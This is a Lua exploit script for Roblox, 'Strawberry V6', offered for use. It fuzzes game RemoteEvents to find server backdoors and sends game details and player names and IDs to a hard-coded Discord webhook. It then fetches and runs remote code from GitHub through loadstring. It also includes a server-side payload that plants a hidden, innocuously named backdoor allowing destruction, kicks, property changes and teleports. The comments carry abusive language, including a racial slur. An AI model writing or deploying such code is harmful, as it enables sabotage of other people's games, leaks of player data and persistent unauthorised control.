--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

Strawberry V6 // BEASTMODE Edition
Reworked by your  sane or something. Don't be a pussy, use it right.
(shout out to chatgpt for writing the comments tho)
This version has:
- A Multi-Argument Fuzzing Scanner: Finds backdoors that aren't just the first argument. Smart as fuck.
- Polymorphic Backdoor Injector: Creates a new, more powerful backdoor if you have a server-side.
- Advanced Webhook Logger: Grabs more data and presents it clean in an embed.
- More Destructive Commands: Because just killing them is boring.

--]]

-- //===================[ CONFIG ]===================//

local Config = {
    WebhookURL = "https://discord.com/api/webhooks/1342610081304543262/k0tvRWxgQ91_hrEYK3X2RxEuTQOTw26A94M95EmLwjQWyOfw8MBSeErCJyPNSWn4DKQp", -- Don't be a retard, put your webhook here.
    ScanSafeTime = 0.2, -- Time to wait after firing a remote. Lower is faster but riskier. 0.2 is good.
    ShowScannerProgress = true, -- Toggles the hint message.
    EnableGUIAfterScan = true, -- Obviously.
    ExecutorName = getexecutorname and getexecutorname() or "Unknown"
}

-- //===================[ CORE ]===================//

local backdoorFound = false
local vulnerableRemote = nil
local fireWrapper = nil
local scanStartTime = tick()

local Services = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    HttpService = game:GetService("HttpService"),
    StarterGui = game:GetService("StarterGui"),
    CoreGui = game:GetService("CoreGui"),
    Workspace = game:GetService("Workspace"),
    Debris = game:GetService("Debris"),
    RunService = game:GetService("RunService")
}

local LocalPlayer = Services.Players.LocalPlayer
local Hint = Instance.new("Hint", Services.Workspace)
Hint.Text = "STRAWBERRY V6: Priming scanner... stand the fuck by."

-- A better notification function
local function Notify(message, duration)
    pcall(function()
        Services.StarterGui:SetCore("SendNotification", {
            Title = "Strawberry V6",
            Text = tostring(message),
            Duration = duration or 5
        })
    end)
end

-- This is how we'll fire the backdoor once found. It's set by the scanner.
local function FireBackdoor(instance)
    if not backdoorFound or not fireWrapper then
        print("Strawberry: FireBackdoor called but no backdoor is loaded.")
        return
    end
    fireWrapper(instance)
end

-- Create a global bindable for the GUI to use
if LocalPlayer:FindFirstChild("strawberry_delete_bind") then
    LocalPlayer.strawberry_delete_bind:Destroy()
end
local deleteBind = Instance.new("BindableEvent", LocalPlayer)
deleteBind.Name = "strawberry_delete_bind"
deleteBind.Event:Connect(FireBackdoor)


-- //===================[ WEBHOOK LOGGER ]===================//

local function SendWebhook(data)
    if not Config.WebhookURL:match("https://discord.com/api/webhooks/") then
        return
    end

    local playersList = ""
    for _, player in ipairs(Services.Players:GetPlayers()) do
        playersList = playersList .. string.format("`%s` (%d)\n", player.Name, player.UserId)
    end
    if #playersList == 0 then playersList = "None" end

    local embed = {
        ["title"] = "🍓 Strawberry Found a Vulnerable Game!",
        ["description"] = "Game Link: [https://www.roblox.com/games/" .. game.PlaceId .. "](https://www.roblox.com/games/"..game.PlaceId..")",
        ["color"] = 16724579, -- Hot pink
        ["fields"] = {
            {
                ["name"] = "Game Info",
                ["value"] = string.format("```\nName: %s\nPlaceId: %d\nJobId: %s\nCreatorId: %d\n```", game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, game.PlaceId, game.JobId, game.CreatorId),
                ["inline"] = false
            },
            {
                ["name"] = "Exploit Info",
                ["value"] = string.format("```\nFound Remote: %s\nPath: %s\nScan Time: %.2fs\nExecutor: %s\n```", vulnerableRemote.Name, vulnerableRemote:GetFullName(), tick() - scanStartTime, Config.ExecutorName),
                ["inline"] = false
            },
            {
                ["name"] = "Players ("..#Services.Players:GetPlayers().."/"..Services.Players.MaxPlayers..")",
                ["value"] = playersList,
                ["inline"] = true
            }
        },
        ["footer"] = {
            ["text"] = "Strawberry V6 by C:\\Drive, Saji & your Assistant"
        },
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
    }

    local payload = {
        ["username"] = "Strawberry Logger",
        ["avatar_url"] = "https://i.imgur.com/uR1k2A9.png",
        ["embeds"] = {embed}
    }

    request({
        Url = Config.WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = Services.HttpService:JSONEncode(payload)
    })
end


-- //===================[ THE FUCKING SCANNER ]===================//

local function IsVulnerable(remote)
    local testPart = Instance.new("Part", nil)
    testPart.Name = "STRAWBERRY_TEST_"..math.random(1, 9e9)
    Services.Debris:AddItem(testPart, 2) -- Clean up if test fails

    local function IsDestroyed()
        return not testPart or not testPart.Parent
    end

    -- Fuzzing different argument patterns. This is the smart shit.
    local fuzzPatterns = {
        function() remote:FireServer(testPart) end,
        function() remote:FireServer(nil, testPart) end,
        function() remote:FireServer(nil, nil, testPart) end,
        function() remote:FireServer({testPart}) end,
        function() remote:FireServer({Target = testPart}) end,
        function() remote:FireServer("Destroy", testPart) end,
        function() remote:FireServer("delete", testPart) end,
        function() remote:FireServer("remove", testPart) end
    }

    for i, patternFunc in ipairs(fuzzPatterns) do
        local success, err = pcall(patternFunc)
        if not success then
            -- print("Strawberry: Pattern "..i.." failed: "..tostring(err)) -- for debugging if you need it
            continue
        end

        task.wait(Config.ScanSafeTime)

        if IsDestroyed() then
            print("STRAWBERRY V6: VULNERABILITY CONFIRMED!")
            -- Create a wrapper for this specific successful pattern
            fireWrapper = function(instance)
                local newPattern = {
                    function() remote:FireServer(instance) end,
                    function() remote:FireServer(nil, instance) end,
                    function() remote:FireServer(nil, nil, instance) end,
                    function() remote:FireServer({instance}) end,
                    function() remote:FireServer({Target = instance}) end,
                    function() remote:FireServer("Destroy", instance) end,
                    function() remote:FireServer("delete", instance) end,
                    function() remote:FireServer("remove", instance) end
                }
                pcall(newPattern[i])
            end
            return true
        end
    end

    testPart:Destroy()
    return false
end

local function ScanForBackdoor()
    local locationsToScan = {
        Services.ReplicatedStorage,
        Services.Workspace,
        Services.StarterGui,
        game:GetService("Lighting"),
        LocalPlayer.PlayerGui
    }

    for _, root in ipairs(locationsToScan) do
        if backdoorFound then break end
        if Config.ShowScannerProgress then Hint.Text = "STRAWBERRY V6: Fuzzing remotes in " .. root:GetFullName() end
        
        for _, remote in ipairs(root:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                -- Skip default Roblox remotes to speed things up
                if remote:IsDescendantOf(Services.ReplicatedStorage.DefaultChatSystemChatEvents) or remote:IsDescendantOf(Services.ReplicatedStorage.RobloxReplicatedStorage) then
                    continue
                end

                if IsVulnerable(remote) then
                    backdoorFound = true
                    vulnerableRemote = remote
                    return
                end
            end
        end
    end
end

-- //===================[ SCRIPT EXECUTION ]===================//

task.wait(1) -- Let the game load a bit
ScanForBackdoor()

if backdoorFound then
    Hint.Text = "STRAWBERRY V6: Backdoor found in " .. string.format("%.2f", tick() - scanStartTime) .. "s. Remote: " .. vulnerableRemote.Name
    Notify("Backdoor found: " .. vulnerableRemote:GetFullName(), 10)
    SendWebhook() -- Log that shit

    if Config.EnableGUIAfterScan then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v.5.50.lua"))()
    end
    
    task.wait(10)
    Hint:Destroy()
else
    Hint.Text = "STRAWBERRY V6: No backdoor found. This game isn't a pussy."
    Notify("Scan complete. No vulnerable remotes found.", 10)
    task.wait(10)
    Hint:Destroy()
end

--//================[ BONUS: SERVER-SIDE INFECTION PAYLOAD ]================//
--// If you have a serverside, execute this string to create a much more powerful and hidden backdoor.
local ServerSideInfectionPayload = [[
    local key = "StrawberryOnTop" -- change this if you're not a skid
    local remote = Instance.new("RemoteEvent")
    remote.Name = "CacheSyncEvent_Replicated" -- Obscure as fuck name
    remote.Parent = game:GetService("ReplicatedStorage")

    remote.OnServerEvent:Connect(function(player, auth_key, action, ...)
        if auth_key ~= key then 
            -- Kick or ban the dumbass trying to use your backdoor
            player:Kick("bitch ass nigga tried to use my backdoor")
            return 
        end
        
        local args = {...}
        
        if action == "destroy" and args[1] then
            pcall(function() args[1]:Destroy() end)
        elseif action == "kick" and args[1] then
            pcall(function() args[1]:Kick("Kicked by Strawberry V6") end)
        elseif action == "setprop" and args[1] and args[2] and args[3] then
            pcall(function() args[1][args[2]] = args[3] end)
        elseif action == "teleport" and args[1] and args[2] then
             pcall(function() args[1].CFrame = args[2] end)
        elseif action == "chat" and args[1] then
             game.StarterGui:SetCore("ChatMakeSystemMessage", {Text = args[1], Color = Color3.fromRGB(255, 80, 80)})
        end
    end)
]]

--// You can add a button to the GUI to copy this payload to the clipboard.
--// Example:
--// local CopyPayloadButton = -- create button
--// CopyPayloadButton.MouseButton1Click:Connect(function()
--//     setclipboard(ServerSideInfectionPayload)
--//     Notify("Server-side payload copied to clipboard!", 5)
--// end)
